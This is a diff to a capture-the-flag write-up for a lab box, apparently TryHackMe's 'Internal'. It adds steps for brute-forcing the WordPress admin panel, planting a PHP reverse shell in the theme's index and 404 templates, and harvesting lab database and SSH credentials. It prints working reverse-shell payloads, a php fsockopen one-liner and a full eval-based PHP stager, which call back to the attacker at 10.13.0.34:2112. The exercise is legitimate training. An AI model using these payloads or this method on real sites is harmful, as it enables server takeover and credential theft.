@@ -223,12 +223,12 @@ Interesting Finding(s):
 
 
 ```
-The most interesting thing about this is this line here `XML-RPC seems to be enabled`. This could lead us to a potential exploitation.
+The most interesting thing about this is this line here `XML-RPC seems to be enabled`. This could lead give us a potential exploitation.
 
 
 ### Summary of findings so far
 
-Let's sum up all the information we have obstained so far:
+Let's sum up all the information we have obtained so far:
 
 - Open Ports:
   - Port 80: Wordpress blog(default admin panel `/wp-admin` and possible `admin` username and `XML-RPC enabled http://internal.thm/blog/xmlrpc.php`).
@@ -270,15 +270,64 @@ Trying admin / lizzy Time: 00:10:20 <                                           
 [!] Valid Combinations Found:                                                                                                                           
  | Username: admin, Password: my2boys
 ```
-if we try to log into wodpress admin panel with those credentials, we do get access:
+if we try to log into wordpress admin panel with those credentials, we do get access:
 
 ![we get access wordpress admin panel](https://i.imgur.com/LWGrDUt.png)
 
-From here on we can potentially try to gain access in a couple of ways, the one I'm familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let's see if we can manage to do that.
+If we look at the blog now that we are logged in we see one private post that smells like a decoy:
+
+![Private post](https://i.imgur.com/5tIWgvM.png)
+
+We'll have that in mind. Anyways, from here on we can potentially try to gain access in a couple of ways, the one I'm familiar is with trying to upload/modify a certain file that can give us a reverse shell connection. Let's see if we can manage to do that.
 
 > At this point another piece of information from the `wpscan` results came to my attention. There was a mention of an outdated theme. I know there are theme vulnerabilities out there, that could be another way in. We'll have that in mind.
 
+We'll try to get a one-liner php reverse shell to run inside one of the php pages that wordpress runs.
 
+First we prepare our reverse shell: `php -r '$sock=fsockopen(getenv("10.13.0.34"),getenv("2112"));exec("/bin/sh -i <&3 >&3 2>&3");'`
+
+We'll use our lucky port `2112`. Now we need to see where we can inject this code to make it run.
+
+> Remember to start `nc -nlvp 2112`.
+
+Ideally we need to locate a file that gets loaded by wordpress by default or we could also try to inject the code into one of the files that gets loaded by the theme that's currently set as active. Let's try this one first since wodpress provides a nice way of editing the active theme files directly in the admin panel.
+
+![We locate our target wordpress theme file](https://i.imgur.com/2NUlDOa.png)
+
+If we look at the available theme files, we see one called `Main Index Template index.php`. Let's pick that one to host our payload. We just add our one-liner reverse shell inside the `<?php ----file content---- ?>` tags:
+
+![we inject our payload](https://i.imgur.com/ra3nAiu.png)
+
+Then we just click `Update File` button. And we should get confirmation the file was updated successfully:
+
+![file updated successfully](https://i.imgur.com/Dts1PvS.png)
+
+This alone won't give us a connection, we now need to find a way to trigger that file. Since the file we choose its a critical part of the theme we might just get what we need by just refreshing the page as a guest:
+
+![We are not lucky](https://i.imgur.com/0quoiJq.png)
+
+That does not seem to work
+
+Since it is just failing to load the page at all, I think the payload could be bad. Let's try again but this time with this payload from Rapid7:
+
+```php
+/*<?php /**/ error_reporting(0); $ip = '10.13.0.34'; $port = 2112; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+```
+
+Even though I am getting an initial connection, it closes right up.
+
+```sh
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 2112
+listening on [any] 2112 ...
+connect to [10.13.0.34] from (UNKNOWN) [10.10.217.146] 38492
+```
+
+There is another exploit we can try, this time from `pentestmonkeys` I've used several exploits from that site before. You can find this particular one [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+
+We just need to update IP and PORT, paste the exploit at the end of the `404 template file` and then call a non-existing blog post URL to trigger it. This time we do get our reverse shell:
+
+![reverse Shell](https://i.imgur.com/iEKyBN0.png)
 
 ### XML-RPC
 
@@ -335,10 +384,76 @@ Sadly this approach does not seem to work as I get:
 </methodResponse>
 ```
 
+This seems like a dead end.
 
 ## Stage 4 - Exploitation
 
 > "With a map of all possible vulnerabilities and entry points, the pentester begins to test the exploits found within your network, applications, and data. The goal is for the ethical hacker is to see exactly how far they can get into your environment, identify high-value targets, and avoid any detection." _from [Cipher.com](https://cipher.com/blog/a-complete-guide-to-the-phases-of-penetration-testing/)_
+
+
+We now have our initial foothold on the server, we managed to get a reverse shell connection by:
+1. Bruteforcing our way into Wordpress admin panel.
+2. Finding a good php reverse shell script.
+3. Injecting the script in a theme file that we could access, in this case the 404 template page.
+4. We saved the changes to the theme file and browsed to a URL for post that does not exist.
+5. That causes the theme to load the 404 template and execute our exploit.
+6. We have `www-data` user access now.
+
+We need to find a way to escalate privileges, since we can't do much with the current access level. Let's fire up a local HTTP server for our friend `linPEAS` to see if we can do some recon:
+
+![we upload linpeas](https://i.imgur.com/8ggoE4p.png)
+
+yay! we don't have permissions to run `sh`...
+
+Ok let's do some manual browsing then. After a while of browsin the various folders we can access, there is one location that contains a `config-db.php` file with some information:
+
+![config-db file](https://i.imgur.com/sUarihU.png)
+
+we get some credentials for `phpmyadmin`:
+
+`
+$dbuser='phpmyadmin';
+$dbpass='B2Ud4fEOZmVq';
+$basepath='';
+$dbname='phpmyadmin';
+$dbserver='localhost';
+$dbport='3306';
+$dbtype='mysql';
+`
+
+Let's see if maybe we can log into `/phpmyadmin` with those credentials:
+
+![we access phpmyadmin](https://i.imgur.com/qcPcfqP.png)
+
+
+Let's continue searching for any other interesting files. At the `opt` directory there is a file that gives us another set of credentials. This time for `aubreanna` which was a user folder we could not access when browsing around. we also got a mention of someone called `Bill`.
+
+![we got more credentials](https://i.imgur.com/pZ9foU1.png)
+
+`Bill aubreanna:bubb13guM!@#123`
+
+We know the first set of credentials are for the phpmyadmin panel. Could the second set be for SSH login? let's find out:
+
+![we get access with aubreanna's credentials](https://i.imgur.com/lQvK8Uo.png)
+
+![](https://motherboard-images.vice.com/content-images/contentimage/25533/1441923229850959.gif)
+
+_We are in! (excuse the cinema cliche)_
+
+Let's see if we can find that user flag today. Turns out it was right there in the base directory:
+
+![we got the user flag](https://i.imgur.com/9v6kaOQ.png)
+
+There is also another file called `jenkins.txt` that lets us know about a service running:
+
+```sh
+aubreanna@internal:~$ cat jenkins.txt
+Internal Jenkins service is running on 172.17.0.2:8080
+```
+We try uploading `linpeas.sh` again run a `chmod +x linpeas.sh`, and run `linpeas.sh`. This time it runs fine, let's wait and see what it finds.
+
+
+Ok good progress, we'll pick this up tomorrow. It's been a LONG day, need some shut eye.
 
 
 ## Stage 5 - Post-Exploitation, Risk Analysis & Recommendations
